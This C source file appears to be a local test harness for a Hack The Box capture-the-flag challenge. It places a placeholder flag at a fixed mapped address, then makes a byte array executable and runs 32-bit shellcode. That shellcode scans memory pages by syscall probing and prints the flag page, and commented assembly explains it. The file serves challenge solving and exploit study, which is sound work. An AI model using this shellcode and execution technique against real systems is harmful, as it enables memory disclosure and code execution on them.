#include <sys/mman.h>
#include <stdio.h>
#include <stdint.h>


int main() {
    void *addr = (void*)0x67670000;

    char *mmap_result = mmap(addr, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);

    char flag[] = "HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}";
    for (int i = 0; i < sizeof(flag); i++) {
        mmap_result[i] = flag[i];
    }

    printf("mmap_result = %p\n", mmap_result);
    
    if (mmap_result == MAP_FAILED) {
        return -1;
    }

    // for (uint32_t i = 0x60000000; i < 0xf7000000; i = i + 0x1000) {
    //     void *mmap_result = mmap((void*)i, 0x1, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    //     if (addr != i) {
    //         munmap(mmap_result, 0x1000);
    //     } else {
    //         printf("found = %i, res = %p\n", i, mmap_result);
    //         break;
    //     }
    // }

    // __asm__(
    //     // "int $3\n"
    //     "mov $0x5ffff000, %ebx\n"
    //     "loop:\n"
    //     "add $0x1000, %ebx\n"
    //     "mov $0xdb, %eax\n"
    //     "mov $0x1000, %ecx\n"
    //     "mov $0x0, %edx\n"
    //     "int $0x80\n"
    //     "cmp $0x0, %eax\n"
    //     "jnz loop\n"
    //     "sub $0x8, %esp\n"
    //     "mov %ebx, %ecx\n"
    //     "mov $0x4, %eax\n"
    //     "mov $0x1, %ebx\n"
    //     "mov $37, %edx\n"
    //     // "int $3\n"
    //     "int $0x80\n"
    // );

    uint8_t shellcode[] = {
        0xbb, 0x00, 0xf0, 0xff, 0x5f, 0x81, 0xc3, 0x00, 0x10, 0x00, 0x00, 0xb8, 0xdb, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0xcd, 0x80, 0x83, 0xf8, 0x00, 0x75, 0xe4, 0x83, 0xec, 0x08, 0x89, 0xd9, 0xb8, 0x04, 0x00, 0x00, 0x00, 0xbb, 0x01, 0x00, 0x00, 0x00, 0xba, 0x25, 0x00, 0x00, 0x00, 0xcd, 0x80
    };
    uint32_t shellcode_page = ((uint32_t)shellcode / 0x1000) * 0x1000;
    uint32_t len = (uint32_t)shellcode - shellcode_page + sizeof(shellcode);
    mprotect((void*)shellcode_page, len, PROT_EXEC | PROT_READ | PROT_WRITE);
    (*(void(*)())shellcode)();


    return 0;
}